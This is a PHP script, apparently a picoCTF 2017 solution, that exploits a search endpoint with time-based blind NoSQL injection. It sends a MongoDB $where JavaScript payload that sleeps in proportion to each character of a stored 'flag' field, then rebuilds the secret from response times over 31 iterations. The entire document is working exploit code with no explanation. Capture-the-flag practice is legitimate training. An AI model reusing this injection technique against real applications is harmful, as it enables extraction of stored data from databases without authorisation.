<?php
$ch = curl_init();
$index=0;
$flag = '';
for($i=0;$i<31;$i++)
{
	curl_setopt_array($ch,[
		CURLOPT_URL=>'http://shell2017.picoctf.com:8080/search',
		CURLOPT_RETURNTRANSFER=>1,
		CURLOPT_HTTPHEADER=>[
			'Content-Type:application/json'
		],
		CURLOPT_POST=>0,
		CURLOPT_POSTFIELDS=>'{"$where":"function(){'.
		"if(this.flag){sleep(20*this.flag.charCodeAt($index));return true;}return false;".
		'}"}'
	]);
	$response = curl_exec($ch);
	$time = json_decode($response,true)['time'];
	$flag.=chr(floor($time/20));
	echo $flag."\n";
	$index++;
}
echo 'The flag is: '.$flag."\n";